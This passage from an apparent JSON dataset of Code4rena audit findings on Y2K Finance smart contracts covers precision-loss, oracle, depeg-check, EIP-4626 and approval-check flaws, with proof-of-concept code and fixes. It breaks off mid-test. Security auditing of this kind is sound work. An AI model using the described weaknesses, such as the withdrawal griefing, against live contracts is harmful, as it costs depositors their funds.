      "source_link": "https://code4rena.com/reports/2022-09-y2k-finance",
      "github_link": "https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/378",
      "tags": [],
      "finders": [
        "rbserver",
        "robee",
        "Chom",
        "ak1",
        "nalus"
      ]
    },
    {
      "id": "5784",
      "title": "[M-03] StakingRewards: Significant loss of precision possible",
      "impact": "MEDIUM",
      "content": "\nIn `notifyRewardAmount`, the reward rate per second is calculated. This calculation rounds down, which can lead to situations where significantly less rewards are paid out to stakers, because the effect of the rounding is multiplied by the duration.\n\n### Proof Of Concept\n\nLet's say we have a `rewardsDuration` of 4 years, i.e. 126144000 seconds. We assume the `rewardRate` is currently ß and `notifyRewardAmount` is called with the reward amount 252287999. Because the calculation rounds down, `rewardRate` will be 1.\nAfter the 4 years, the user have received 126144000 reward tokens. However, 126143999 (i.e., almost 50%) of the reward tokens that were intended to be distributed to the stakers were not distributed, resulting in monetary loss for all stakers.\n\n### Recommended Mitigation Steps\n\nYou could accumulate the differences that occur due to rounding and let the users claim them in the end according to their shares.\n\n**[MiguelBits (Y2K Finance) acknowledged](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/225)** \n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/225#issuecomment-1298542184):**\n > While it's an edge case, the numbers used in the POC are reasonable if we consider small token decimals (eg. EURS with 2 decimals).\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue in the StakingRewards.sol file that can lead to a significant amount of rewards not being paid out to stakers. The issue occurs when the reward rate per second is calculated in the 'notifyRewardAmount' function. This calculation rounds down, which can cause the effect of the rounding to be multiplied by the duration of the reward. \n\nFor example, if a reward duration of 4 years is assumed, with a reward rate of ß and a reward amount of 252287999, after the 4 years the user would have received 126144000 reward tokens. However, due to the rounding down, almost 50% of the reward tokens intended to be distributed to the stakers were not distributed, resulting in monetary loss for all stakers.\n\nThe recommended mitigation step is to accumulate the differences that occur due to the rounding and let the users claim them in the end according to their shares.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Y2k Finance",
      "source_link": "https://code4rena.com/reports/2022-09-y2k-finance",
      "github_link": "https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/225",
      "tags": [],
      "finders": [
        "Lambda"
      ]
    },
    {
      "id": "5783",
      "title": "[M-02] Fee-on-Transfer tokens cause problems in multiple places",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/bca5080635370424a9fe21fe1aded98345d1f723/src/SemiFungibleVault.sol#L94>\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/bca5080635370424a9fe21fe1aded98345d1f723/src/Controller.sol#L168>\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/bca5080635370424a9fe21fe1aded98345d1f723/src/Controller.sol#L225>\n\n### Impact & Proof Of Concept\n\nCertain tokens (e.g., STA or PAXG) charge a fee for transfers and others (e.g., USDT or USDC) may start doing so in the future. This is not correctly handled in multiple places and would lead to a loss of funds:\n1. `SemiFungibleVault.deposit`: Here, less tokens are transferred to the vault than the amount of shares that is minted to the user. This is an accounting mistake that will ultimately lead to the situation where the last user(s) cannot withdraw anymore, because there are no more assets left.\n2. `Controller.triggerDepeg` & `Controller.triggerEndEpoch`: `sendTokens` tries to send the whole asset balance to the other contract, which will fail when less tokens are available at this point (because the previous accounting was done without incorporating fees). This will mean that the end can never be triggered and all assets are lost.\n\n### Recommended Mitigation Steps\n\nWhen fee-on-transfer tokens should be supported, you need to check the actual balance differences. If they are not supported, this should be clearly documented.\n\n**[MiguelBits (Y2K Finance) acknowledged](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/221)** \n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/221#issuecomment-1297157333):**\n > Valid because SemiFungibleVault may not be applied to WETH only (unlike Vault), but generic tokens. Furthermore, if there is an intention to make semi fungible vaults an EIP standard, then one may have to consider catering to FoT tokens as well, unless explicitly stated otherwise.\n\n\n\n***\n\n",
      "summary": "\nA bug report has been filed regarding the code for a SemiFungibleVault and Controller in the 2022-09-y2k-finance project on GitHub. The bug is related to incorrect handling of certain tokens that charge fees for transfers, which could lead to a loss of funds. The bug is present in the code for SemiFungibleVault.deposit, Controller.triggerDepeg, and Controller.triggerEndEpoch. \n\nThe issue occurs when less tokens are transferred to the vault than the amount of shares that is minted to the user. This accounting mistake will eventually lead to the situation where the last user(s) cannot withdraw anymore, because there are no more assets left. Additionally, when the sendTokens function tries to send the whole asset balance to the other contract, it will fail if there are less tokens available due to the incorrect accounting. This will mean that the end can never be triggered and all assets are lost. \n\nTo mitigate this issue, it is recommended to check the actual balance differences when fee-on-transfer tokens should be supported. If they are not supported, this should be clearly documented.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Y2k Finance",
      "source_link": "https://code4rena.com/reports/2022-09-y2k-finance",
      "github_link": "https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/221",
      "tags": [
        "Fee On Transfer"
      ],
      "finders": [
        "csanuragjain",
        "Deivitto",
        "Rolezn",
        "Lambda",
        "R2"
      ]
    },
    {
      "id": "5782",
      "title": "[M-01] Oracle is tracked per token instead of per pair, leading to surprise results",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/VaultFactory.sol#L121>\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/VaultFactory.sol#L221-L223>\n\n### Impact\n\nOracles are tracked by individual token, instead of by pair. Because for some tokens (ie BTC) it is unclear which implementation is the canonical one to compare others to, this can result in a situation where different pairs (ie ibBTC-wBTC and ibBC-renBTC) using the same oracle, which will be incorrect for one of them.\n\n### Proof of Concept\n\nThe protocol assumes that there is a canonical asset to compare pegged assets to, so oracles are tracked only by the pegged asset. However, for some assets (like BTC), there is no clear canonical asset, and the result is that tracking `tokenToOracle` is not sufficient.\n\nWhen there is a conflict in `tokenToOracle`, the protocol responds by skipping the assignment and keeping the old value:\n\n    if (tokenToOracle[_token] == address(0)) {\n        tokenToOracle[_token] = _oracle;\n    }\n\nThe result of this is that the protocol may define a new pair with a new oracle, and have it silently skip it and use a non-matching oracle. As an example:\n\n*   The admins start with an implementation of ibBTC-wBTC, deploying the oracle\n*   This is set as `tokenToOracle[ibBTC]`\n*   Later, the admins create a new pair for ibBTC-renBTC, deploying a new oracle\n*   The protocol silently skips this assignment and uses the ibBTC-wBTC oracle\n\nThis can produce incorrect results, for example if wBTC appreciates relative to the other two, or if both ibBTC and renBTC depeg.\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nChange `tokenToOracle` to represent the pair of tokens, either by creating a `Pair` struct as the key, or by nesting a mapping inside of another mapping.\n\n**[MiguelBit (Y2K Finance) disputed](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/100)** \n\n\n***\n\n",
      "summary": "\nThis bug report concerns a vulnerability in the VaultFactory.sol code, which is part of the 2022-09-y2k-finance project on Github. The code is used to track the oracles for different token pairs, such as ibBTC-wBTC and ibBTC-renBTC. The issue is that the protocol assumes that there is a canonical asset to compare pegged assets to, and oracles are tracked only by the pegged asset. This is not sufficient for some assets, such as Bitcoin, where there is no clear canonical asset.\n\nThe result of this is that the protocol may define a new pair with a new oracle, but it will silently skip it and use a non-matching oracle. This can produce incorrect results, such as if the wBTC appreciates relative to the other two, or if both ibBTC and renBTC depeg.\n\nThe vulnerability was discovered using manual review and Foundry. The recommended mitigation step is to change the `tokenToOracle` to represent the pair of tokens, either by creating a `Pair` struct as the key, or by nesting a mapping inside of another mapping.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Y2k Finance",
      "source_link": "https://code4rena.com/reports/2022-09-y2k-finance",
      "github_link": "https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/100",
      "tags": [],
      "finders": [
        "datapunk  Lambda",
        "PwnPatrol"
      ]
    },
    {
      "id": "5781",
      "title": "[H-09] Depeg event can happen at incorrect price",
      "impact": "HIGH",
      "content": "\nDepeg event can still happen when the price of a pegged asset is equal to the strike price of a Vault which is incorrect.\n\nThis docs clearly mentions:\n\n\"When the price of a pegged asset is below the strike price of a Vault, a Keeper(could be anyone) will trigger the depeg event and both Vaults(hedge and risk) will swap their total assets with the other party.\" - <https://code4rena.com/contests/2022-09-y2k-finance-contest>\n\n### Proof of Concept\n\n1.  Assume strike price of vault is 1 and current price of pegged asset is also 1\n\n2.  User calls [triggerDepeg](https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Controller.sol#L148) function which calls isDisaster modifier to check the depeg eligibility\n\n3.  Now lets see [isDisaster](https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Controller.sol#L83) modifier\n\n<!---->\n\n    modifier isDisaster(uint256 marketIndex, uint256 epochEnd) {\n            address[] memory vaultsAddress = vaultFactory.getVaults(marketIndex);\n            if(\n                vaultsAddress.length != VAULTS_LENGTH\n                )\n                revert MarketDoesNotExist(marketIndex);\n\n            address vaultAddress = vaultsAddress[0];\n            Vault vault = Vault(vaultAddress);\n\n            if(vault.idExists(epochEnd) == false)\n                revert EpochNotExist();\n\n            if(\n                vault.strikePrice() < getLatestPrice(vault.tokenInsured())\n                )\n                revert PriceNotAtStrikePrice(getLatestPrice(vault.tokenInsured()));\n\n            if(\n                vault.idEpochBegin(epochEnd) > block.timestamp)\n                revert EpochNotStarted();\n\n            if(\n                block.timestamp > epochEnd\n                )\n                revert EpochExpired();\n            _;\n        }\n\n4.  Assume block.timestamp is at correct timestamp (between idEpochBegin and epochEnd), so none of revert execute. Lets look into the interesting one at\n\n<!---->\n\n            if(\n                vault.strikePrice() < getLatestPrice(vault.tokenInsured())\n                )\n                revert PriceNotAtStrikePrice(getLatestPrice(vault.tokenInsured()));\n\n5.  Since in our case price of vault=price of pegged asset so if condition does not execute and finally isDisaster completes without any revert meaning go ahead of depeg\n\n6.  But this is incorrect since price is still not below strike price and is just equal\n\n### Recommended Mitigation Steps\n\nChange the isDisaster modifier to revert when price of a pegged asset is equal to the strike price of a Vault\n\n    if(\n                vault.strikePrice() <= getLatestPrice(vault.tokenInsured())\n                )\n                revert PriceNotAtStrikePrice(getLatestPrice(vault.tokenInsured()));\n\n**[MiguelBits (Y2K Finance) disputed and commented](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/69#issuecomment-1256316579):**\n > After discussion, the docs clearly state only below the strike Price\n> ```\n> \n> This docs clearly mentions:\n> \n> \"When the price of a pegged asset is below the strike price of a Vault, a Keeper(could be anyone) will trigger the depeg event and both Vaults(hedge and risk) will swap their total assets with the other party.\" - https://code4rena.com/contests/2022-09-y2k-finance-contest\n> \n> \n> ```\n\n**[csanuragjain (warden) commented](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/69#issuecomment-1257224465):**\n > @MiguelBits Exactly when it is below the strike price but in this case depeg is happening when price is equal and not below. Can you please suggest?\n\n**[MiguelBits (Y2K Finance) confirmed and commented](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/69#issuecomment-1257227650):**\n > Oh I see what you mean, need to correct it!\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/69#issuecomment-1280911900):**\n > Ah, a matter of when the equality sign matters a lot. Critically, in this case. Agree with warden that it should be `<=` and not `<` only.\n\n\n\n***\n\n \n",
      "summary": "\nA bug has been identified in the code of the 2022-09-y2k-finance project, which can be found at the following link: https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Controller.sol#L96. The bug is related to the depeg event, which should only happen when the price of a pegged asset is below the strike price of a Vault. However, the code currently allows for the depeg event to occur even when the price of the pegged asset is equal to the strike price of the Vault.\n\nThe bug is located in the isDisaster modifier, which can be found at https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Controller.sol#L83. If the price of the pegged asset is equal to the strike price of the Vault, then the if condition does not execute, and the depeg event is allowed to occur. This is incorrect, as the depeg event should only occur when the price of the pegged asset is below the strike price of the Vault.\n\nThe recommended mitigation step is to change the isDisaster modifier so that it reverts when the price of the pegged asset is equal to the strike price of the Vault. This can be done by changing the if condition from\n\n```\nif(\n            vault.strikePrice() < getLatestPrice(vault.tokenInsured())\n            )\n            revert PriceNotAtStrikePrice(getLatestPrice(vault.tokenInsured()));\n```\n\nto\n\n```\nif(\n            vault.strikePrice() <= getLatestPrice(vault.tokenInsured())\n            )\n            revert PriceNotAtStrikePrice(getLatestPrice(vault.tokenInsured()));\n```\n\nThis change will ensure that the depeg event does not occur when the price of the pegged asset is equal to the strike price of the Vault.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Y2k Finance",
      "source_link": "https://code4rena.com/reports/2022-09-y2k-finance",
      "github_link": "https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/69",
      "tags": [],
      "finders": [
        "csanuragjain",
        "datapunk",
        "rbserver",
        "bin2chen",
        "Lambda",
        "unforgiven",
        "R2"
      ]
    },
    {
      "id": "5780",
      "title": "[H-08] Vault.sol is not EIP-4626 compliant",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/ac3e86f07bc2f1f51148d2265cc897e8b494adf7/src/Vault.sol#L244-L252>\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/ac3e86f07bc2f1f51148d2265cc897e8b494adf7/src/SemiFungibleVault.sol#L205-L213>\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/ac3e86f07bc2f1f51148d2265cc897e8b494adf7/src/SemiFungibleVault.sol#L237-L239>\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/ac3e86f07bc2f1f51148d2265cc897e8b494adf7/src/SemiFungibleVault.sol#L244-L246>\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/ac3e86f07bc2f1f51148d2265cc897e8b494adf7/src/SemiFungibleVault.sol#L251-L258>\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/ac3e86f07bc2f1f51148d2265cc897e8b494adf7/src/SemiFungibleVault.sol#L263-L270>\n\n### Impact\n\nOther protocols that integrate with Y2K may wrongly assume that the functions are EIP-4626 compliant. Thus, it might cause integration problems in the future that can lead to wide range of issues for both parties.\n\n### Proof of Concept\n\nAll official EIP-4626 requirements can be found on it's [official page](https://eips.ethereum.org/EIPS/eip-4626#methods). Non-compliant functions are listed below along with the reason they are not compliant:\n\nThe following functions are missing but should be present:\n\n1.  mint(uint256, address) returns (uint256)\n2.  redeem(uint256, address, address) returns (uint256)\n\nThe following functions are non-compliant because they don't account for withdraw and deposit locking:\n\n1.  maxDeposit\n2.  maxMint\n3.  maxWithdraw\n4.  maxRedeem\n\nAll of the above functions should return 0 when their respective functions are disabled (i.e. maxDeposit should return 0 when deposits are disabled)\n\npreviewDeposit is not compliant because it must account for fees which it does not\n\ntotalAssets is not compliant because it does not always return the underlying managed by the vault because it fails to include the assets paid out during a depeg or the end of the epoch.\n\n### Recommended Mitigation Steps\n\nAll functions listed above should be modified to meet the specifications of EIP-4626.\n\n**[MiguelBits (Y2K Finance) confirmed](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/47)** \n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/47#issuecomment-1280253435):**\n > The premise is valid because it's stated in the README:\n> > Y2K leverages ERC4626 Vault standard for this protocol, this contract is a fork of that standard, although we replaced all uses of ERC20 to ERC1155. \n> \n> As per the ruling in a [previous contest regarding EIP4626](https://github.com/code-423n4/2022-06-notional-coop-findings/issues/155).\n> \n> > Judging this and all duplicate regarding EIP4626 implementation as High Risk.\n> EIP4626 is aimed to create a consistent and robust implementation patterns for Tokenized Vaults. A slight deviation from 4626 would broke composability and potentially lead to loss of funds. It is counterproductive to implement EIP4626 but does not conform to it fully.\n> \n> The missing functions are the most problematic; one expects the `mint()` and `redeem()` to be present, but they're absent instead.\n> \n> Disagree on the `max*()` functions issues; `SemiFungibleVault` is not pausable, functions can't be disabled / paused. Perhaps the inheriting contracts should override these functions, but the way I see it, they can be arbitrarily set in the template.\n> \n> Agree on subsequent points mentioned.\n> \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the functions in the code listed on the GitHub repository that are not compliant with EIP-4626. This issue can lead to integration problems in the future and a wide range of issues for both parties. The functions that are non-compliant and the reason why they are not compliant are listed in the report. All functions should be modified to meet the specifications of EIP-4626 to mitigate this issue. This bug report provides the tools used and the recommended mitigation steps to address the issue.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Y2k Finance",
      "source_link": "https://code4rena.com/reports/2022-09-y2k-finance",
      "github_link": "https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/47",
      "tags": [
        "EIP-4626"
      ],
      "finders": [
        "0x52",
        "Bahurum",
        "PwnPatrol",
        "Jeiwan",
        "Lambda",
        "thebensams"
      ]
    },
    {
      "id": "5779",
      "title": "[H-07] Risk users are required to payout if the price of the pegged asset goes higher than underlying",
      "impact": "HIGH",
      "content": "\nInsurance is to protect the user in case the pegged asset drops significantly below the underlying but risk users are required to payout if the pegged asset is worth more than the underlying.\n\n### Proof of Concept\n\n        if (price1 > price2) {\n            nowPrice = (price2 * 10000) / price1;\n        } else {\n            nowPrice = (price1 * 10000) / price2;\n        }\n\nThe above lines calculates the ratio using the lower of the two prices, which means that in the scenario, the pegged asset is worth more than the underlying, a depeg event will be triggered. This is problematic for two reasons. The first is that many pegged assets are designed to maintain at least the value of the underlying. They put very strong incentives to keep the asset from going below the peg but usually use much looser policies to bring the asset down to the peg, since an upward break from the peg is usually considered benign. The second is that when a pegged asset moves above the underlying, the users who are holding the asset are benefiting from the appreciation of the asset; therefore the insurance is not needed.\n\nBecause of these two reasons, it is my opinion that sellers would demand a higher premium from buyers as a result of the extra risk introduced by the possibility of having to pay out during an upward depeg. It is also my opinion that these higher premiums would push users seeking insurance to other cheaper products that don't include this risk.\n\n### Recommended Mitigation Steps\n\nThe ratio returned should always the ratio of the pegged asset to the underlying (i.e. pegged/underlying).\n\n**[MiguelBits (Y2K Finance) marked as duplicate and commented](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/45#issuecomment-1265962610):**\n > Duplicate of [26](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/26).\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/45#issuecomment-1280876555):**\n > Not a duplicate.\n> \n> Pegged tokens go both ways: either valued more or less than the asset it's pegging to (underlying token). \n> \n> The warden is arguing that when the pegged token is worth more than the underlying (eg. worth > `$1` for a stablecoin), the users are still eligible for a payout, which he argues shouldnt be the case.\n> \n> I agree with the warden; from experience, most projects see it as a positive if their algo stablecoin is worth more than the underlying, and so, wouldn't do nothing about it. In fact, they'd probably use it as a shilling point to attract more users to mint more of these tokens to help bring the price down. This scenario should not be covered by the insurers.\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of the PegOracle.sol file on GitHub. The vulnerability allows for a depeg event to be triggered if the pegged asset is worth more than the underlying. This is problematic because many pegged assets are designed to maintain at least the value of the underlying, and users who are holding the asset are benefiting from the appreciation of the asset. As a result, sellers would demand a higher premium from buyers as a result of the extra risk introduced, which would push users seeking insurance to other cheaper products that don't include this risk. The recommended mitigation step is to make sure the ratio returned is always the ratio of the pegged asset to the underlying (i.e. pegged/underlying).",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Y2k Finance",
      "source_link": "https://code4rena.com/reports/2022-09-y2k-finance",
      "github_link": "https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/45",
      "tags": [
        "Pegged"
      ],
      "finders": [
        "0x52",
        "PwnPatrol",
        "0xDecorativePineapple",
        "Jeiwan",
        "Lambda",
        "hyh"
      ]
    },
    {
      "id": "5778",
      "title": "[H-06] Griefing attack on the Vaults is possible, withdrawing the winning side stakes",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/SemiFungibleVault.sol#L110-L119>\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Vault.sol#L203-L218>\n\n### Vulnerability details\n\n*Anyone* can withdraw to `receiver` once the `receiver` is `isApprovedForAll(owner, receiver)`. The funds will be sent to `receiver`, but it will happen whenever an arbitrary `msg.sender` wants. The only precondition is the presence of any approvals.\n\nThis can be easily used to sabotage the system as a whole. Say there are two depositors in the hedge Vault, Bob and David, both trust each other and approved each other. Mike the attacker observing the coming end of epoch where no depeg happened, calls the `withdraw()` for both Bob and David in the last block of the epoch. Mike gained nothing, while both Bob and David lost the payoff that was guaranteed for them at this point.\n\nSetting the severity to be high as this can be routinely used to sabotage the Y2K users, both risk and hedge, depriving them from the payouts whenever they happen to be on the winning side. Usual attackers here can be the users from another side, risk users attacking hedge vault, and vice versa.\n\n### Proof of Concept\n\n`isApprovedForAll()` in withdrawal functions checks the `receiver` to be approved, not the caller.\n\nSemiFungibleVault's withdraw:\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/SemiFungibleVault.sol#L110-L119>\n\n```solidity\n    function withdraw(\n        uint256 id,\n        uint256 assets,\n        address receiver,\n        address owner\n    ) external virtual returns (uint256 shares) {\n        require(\n            msg.sender == owner || isApprovedForAll(owner, receiver),\n            \"Only owner can withdraw, or owner has approved receiver for all\"\n        );\n```\n\nVault's withdraw:\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Vault.sol#L203-L218>\n\n```solidity\n    function withdraw(\n        uint256 id,\n        uint256 assets,\n        address receiver,\n        address owner\n    )\n        external\n        override\n        epochHasEnded(id)\n        marketExists(id)\n        returns (uint256 shares)\n    {\n        if(\n            msg.sender != owner &&\n            isApprovedForAll(owner, receiver) == false)\n            revert OwnerDidNotAuthorize(msg.sender, owner);\n```\n\nThis way anyone at any time can run withdraw from the Vaults whenever owner has some address approved.\n\n### Recommended Mitigation Steps\n\nConsider changing the approval requirement to be for the caller, not receiver:\n\nSemiFungibleVault's withdraw:\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/SemiFungibleVault.sol#L110-L119>\n\n```solidity\n    function withdraw(\n        uint256 id,\n        uint256 assets,\n        address receiver,\n        address owner\n    ) external virtual returns (uint256 shares) {\n        require(\n-           msg.sender == owner || isApprovedForAll(owner, receiver),\n+           msg.sender == owner || isApprovedForAll(owner, msg.sender),\n            \"Only owner can withdraw, or owner has approved receiver for all\"\n        );\n```\n\nVault's withdraw:\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Vault.sol#L203-L218>\n\n```solidity\n    function withdraw(\n        uint256 id,\n        uint256 assets,\n        address receiver,\n        address owner\n    )\n        external\n        override\n        epochHasEnded(id)\n        marketExists(id)\n        returns (uint256 shares)\n    {\n        if(\n            msg.sender != owner &&\n-           isApprovedForAll(owner, receiver) == false)\n+           isApprovedForAll(owner, msg.sender) == false)\n            revert OwnerDidNotAuthorize(msg.sender, owner);\n```\n\n**[MiguelBits (Y2K Finance) confirmed and commented](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/434#issuecomment-1254129699):**\n > Implementing this.\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/434#issuecomment-1280213733):**\n > Agree with the warden's finding, and the impact of \"depriving them (y2k users) from the payouts whenever they happen to be on the winning side\".\n\n\n\n***\n\n",
      "summary": "\nA bug report has been made for the code-423n4/2022-09-y2k-finance repository. The bug is related to the withdraw() function in the SemiFungibleVault.sol and Vault.sol files. Currently, anyone can withdraw funds to a receiver as long as the receiver is approved by the owner. This means that an attacker can call the withdraw() function for multiple users in the last block of an epoch, potentially depriving them of their payouts. The severity of this bug is high as it can be used regularly to sabotage the users of the y2k system. \n\nThe bug is caused by the isApprovedForAll() function in the withdraw() functions, which checks the receiver instead of the caller. To fix this bug, the approval requirement should be changed to check the caller instead of the receiver. This way, only the owner or someone approved by the owner can withdraw funds.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Y2k Finance",
      "source_link": "https://code4rena.com/reports/2022-09-y2k-finance",
      "github_link": "https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/434",
      "tags": [],
      "finders": [
        "KIntern_NA",
        "0xNazgul",
        "PwnPatrol",
        "pauliax",
        "scaraven",
        "rotcivegaf",
        "joestakey",
        "Respx",
        "peritoflores",
        "Tointer",
        "hyh",
        "Haruxe",
        "0x4non"
      ]
    },
    {
      "id": "5777",
      "title": "[H-05] LOSS OF PRECISION RESULTING IN WRONG VALUE FOR PRICE RATIO",
      "impact": "HIGH",
      "content": "\nThe project implements a price oracle in order to get the relative price between the pegged asset and the price of the original asset (example: stETH to ETH). If the ratio (the pegged asset divided by the original asset) is 1 the Token is pegged, otherwise is depegged.\n\nBelow is a code snippet from the [PegOracle.sol](https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/oracles/PegOracle.sol) function.\n\n     if (price1 > price2) {\n                nowPrice = (price2 * 10000) / price1;\n            } else {\n                nowPrice = (price1 * 10000) / price2;\n            }\n\n            int256 decimals10 = int256(10**(18 - priceFeed1.decimals()));\n            nowPrice = nowPrice * decimals10;\n\n            return (\n                roundID1,\n                nowPrice / 1000000,\n                startedAt1,\n                timeStamp1,\n                answeredInRound1\n            );\n        }\n\nTo fetch the ratio at any time, the `PegOracle.sol` performs some calculations; first the relative price is multiplied by 1e4 and then it returns the above calculation divided by 1e6.\n\nThe [Controller.sol](https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Controller.sol) file makes an external call to the [PegOracle.sol](https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/oracles/PegOracle.sol) oracle to get the relative price. After, the value returned, it is multiplied by `10**(18-(priceFeed.decimals())` and the result represents the relative price between the two assets.\n\nThe result is converted to 18 decimal points in order to be compared with the Strike Price passed by the admin on `VaultFactory.sol`.\n\nDue to the fact that the first multiplication is first divided by `1e6` ([PegOracle.sol#L78)](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/oracles/PegOracle.sol#L78)( and then re-multiplied by `uint256 decimals = 10**(18-(priceFeed.decimals()));` ([Controller.sol#L299-L300](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L299-L300))  it leads to loss of precision. This behavior will make the relative price between the assets incorrect.\n\n### Proof of Concept\n\nBelow is a test that illustrates the above issue for various oracle pairs. The calculated ratio is compared against a modified version of an example of different price denominator, provided by [Chainlink](https://docs.chain.link/docs/get-the-latest-price/#getting-a-different-price-denomination).\n\n    // SPDX-License-Identifier: MIT\n    pragma solidity 0.8.15;\n\n    import \"forge-std/Test.sol\";\n    import \"../lib/AggregatorV3Interface.sol\";\n\n    //run with: forge test --fork-url https://arb1.arbitrum.io/rpc -vv \n\n    contract PegOracle {\n\n        /***\n        @dev  for example: oracle1 would be stETH / USD, while oracle2 would be ETH / USD oracle\n        ***/\n        address public oracle1;\n        address public oracle2;\n\n        uint8 public decimals;\n\n        AggregatorV3Interface internal priceFeed1;\n        AggregatorV3Interface internal priceFeed2;\n\n        /** @notice Contract constructor\n          * @param _oracle1 First oracle address\n          * @param _oracle2 Second oracle address\n          */\n        constructor(address _oracle1, address _oracle2) {\n            require(_oracle1 != address(0), \"oracle1 cannot be the zero address\");\n            require(_oracle2 != address(0), \"oracle2 cannot be the zero address\");\n            require(_oracle1 != _oracle2, \"Cannot be same Oracle\");\n            priceFeed1 = AggregatorV3Interface(_oracle1);\n            priceFeed2 = AggregatorV3Interface(_oracle2);\n            require(\n                (priceFeed1.decimals() == priceFeed2.decimals()),\n                \"Decimals must be the same\"\n            );\n\n            oracle1 = _oracle1;\n            oracle2 = _oracle2;\n\n            decimals = priceFeed1.decimals();\n        }\n\n        /** @notice Returns oracle-fed data from the latest round\n          * @return roundID Current round id \n          * @return nowPrice Current price\n          * @return startedAt Starting timestamp\n          * @return timeStamp Current timestamp\n          * @return answeredInRound Round id for which answer was computed \n          */ \n        function latestRoundData()\n            public\n            view\n            returns (\n                uint80 roundID,\n                int256 nowPrice,\n                uint256 startedAt,\n                uint256 timeStamp,\n                uint80 answeredInRound\n            )\n        {\n            (\n                uint80 roundID1,\n                int256 price1,\n                uint256 startedAt1,\n                uint256 timeStamp1,\n                uint80 answeredInRound1\n            ) = priceFeed1.latestRoundData();\n\n            int256 price2 = getOracle2_Price();\n\n            if (price1 > price2) {\n                nowPrice = (price2 * 10000) / price1;\n            } else {\n                nowPrice = (price1 * 10000) / price2;\n            }\n\n            int256 decimals10 = int256(10**(18 - priceFeed1.decimals()));\n            nowPrice = nowPrice * decimals10;\n\n            return (\n                roundID1,\n                nowPrice / 1000000, //1000000,\n                startedAt1,\n                timeStamp1,\n                answeredInRound1\n            );\n        }\n\n        /* solhint-disbable-next-line func-name-mixedcase */\n        /** @notice Lookup first oracle price\n          * @return price Current first oracle price\n          */ \n        function getOracle1_Price() public view returns (int256 price) {\n            (\n                uint80 roundID1,\n                int256 price1,\n                ,\n                uint256 timeStamp1,\n                uint80 answeredInRound1\n            ) = 